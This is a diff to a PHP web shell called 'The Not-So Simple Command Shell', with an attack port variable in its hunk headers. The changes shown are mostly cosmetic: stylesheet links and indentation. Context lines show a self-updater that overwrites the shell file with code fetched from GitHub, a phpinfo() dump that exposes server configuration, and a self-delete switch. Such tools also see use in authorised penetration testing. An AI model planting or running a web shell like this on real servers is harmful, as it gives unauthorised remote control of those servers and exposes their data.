@@ -17,6 +17,8 @@ $attackport = "8000";
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
     <title>The Not-So Simple Command Shell by KaotickJ</title>
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"> 
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
     <script src="//code.jquery.com/jquery-1.10.2.js"></script>
     </head>
     <body>
@@ -138,7 +140,8 @@ $attackport = "8000";
 
         if (isset($_GET['update']) && $_GET['update'] == "true"){
             file_put_contents('nsscmdshell.php', file_get_contents('https://raw.githubusercontent.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/main/nsscmdshell.php'));
-            }
+		}
+
         if (isset($_GET['links'])) {
            echo '<div style="width:50%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">
             <p>Quick Links:</p>
@@ -151,17 +154,17 @@ $attackport = "8000";
             }
 
 if (is_get_request()){
-if (isset($_GET['phpInfo'])) {
+	if (isset($_GET['phpInfo'])) {
 //        echo '<pre>';
         phpinfo();
 //        echo '</pre>';
-     }
+    }
     if (isset($_GET['kill_me'])) {
             if (!unlink ('nsscmdshell.php')){
                 die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>File can\'t be deleted.</p>');
             }
             else {
-             echo 'Success!<br>';
+				echo 'Success!<br>';
             }
 
     }
